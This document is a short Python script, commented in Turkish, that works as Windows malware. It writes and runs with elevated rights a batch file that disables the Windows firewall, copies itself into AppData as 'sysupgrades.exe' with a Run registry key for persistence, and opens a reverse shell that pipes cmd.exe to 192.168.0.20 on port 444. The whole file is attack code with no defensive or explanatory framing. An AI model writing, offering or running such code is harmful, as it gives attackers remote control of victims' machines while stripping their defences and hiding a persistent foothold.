import time
import subprocess
import os
import shutil
import sys
import os,socket,subprocess,threading;
import ctypes

# .bat içeriği
bat_code = """
@echo off
echo Güvenlik duvarı kapatılıyor...
netsh advfirewall set allprofiles state off
pause
"""
# Bat dosyasını yaz
bat_path = os.path.join(os.environ["TEMP"], "disable_firewall.bat")
with open(bat_path, "w") as file:
    file.write(bat_code)

# Yönetici olarak çalıştır (ShellExecuteW)
ctypes.windll.shell32.ShellExecuteW(None, "runas", bat_path, None, None, 1)
def add_to_registry():
    
	#persistence
	new_file = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)

add_to_registry()
#my_check = subprocess.check_output("commmand",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
def hello444(Port2,İP2):
    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.20",444))

    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

Port2=int(444)
İP2=str("192.168.0.20")
hello444(Port2,İP2)